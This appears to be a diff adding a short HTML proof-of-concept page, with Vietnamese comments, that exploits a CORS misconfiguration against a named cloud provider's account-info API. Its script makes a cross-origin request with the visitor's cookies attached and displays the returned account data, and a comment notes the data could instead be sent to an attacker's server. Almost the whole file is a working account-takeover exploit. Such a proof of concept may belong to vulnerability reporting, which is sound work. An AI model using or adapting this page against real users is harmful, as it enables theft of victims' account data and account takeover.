@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC - Timeweb Account Takeover</title>
+</head>
+<body>
+    <h1>Đang khai thác lỗi CORS...</h1>
+    <pre id="result">Đang chờ dữ liệu...</pre>
+
+    <script>
+        // URL endpoint bị lỗi
+        var targetUrl = "https://timeweb.cloud/api/v2/accounts/info";
+
+        // Tạo request cross-origin
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", targetUrl, true);
+        
+        // BẮT BUỘC phải có dòng này để gửi kèm cookie của nạn nhân
+        xhr.withCredentials = true; 
+
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                // In dữ liệu bị rò rỉ ra màn hình (hoặc gửi về server của attacker)
+                document.getElementById("result").innerText = xhr.responseText;
+            }
+        };
+
+        xhr.onerror = function() {
+            document.getElementById("result").innerText = "Lỗi kết nối hoặc bị chặn bởi CORS.";
+        };
+
+        xhr.send();
+    </script>
+</body>
+</html>
